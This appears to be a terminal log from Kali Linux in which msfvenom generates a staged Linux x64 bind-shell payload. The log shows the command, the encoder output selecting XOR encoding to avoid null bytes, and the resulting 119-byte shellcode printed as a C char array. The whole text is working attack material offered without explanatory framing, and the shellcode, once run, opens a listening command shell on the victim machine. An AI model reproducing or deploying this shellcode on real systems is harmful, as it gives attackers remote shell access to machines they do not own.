linux/x64/shell/bind_tcp                            Spawn a command shell (staged). Listen for a connection

root@kali:~# msfvenom -p linux/x64/shell/bind_tcp -f c -b \x00 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 2 compatible encoders
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=19, char=0x00)
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of c file: 524 bytes
unsigned char buf[] = 
"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x21\x0d\x57\x16\x6c\x8c\x18\xa5\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x4b\x24\x0f\x8f\x06\x8e"
"\x47\xcf\x20\x53\x58\x13\x24\x1b\x4a\x62\x25\x29\x55\x16\x7d"
"\xd0\x50\x2c\xc7\x67\x47\x4c\x06\xbd\x40\xaa\x24\x54\x3d\x24"
"\x34\x83\x1d\xed\xb7\x67\x7c\x4e\x63\x89\x48\xf3\x7e\x67\x5e"
"\x4e\xf5\x3a\x08\xed\xa8\xdb\x1a\x27\xa5\xe6\x3a\xe4\x7b\xbf"
"\x50\x19\x69\xc4\x8e\xed\xb6\x52\x58\x13\x93\x6a\x18\xa5";

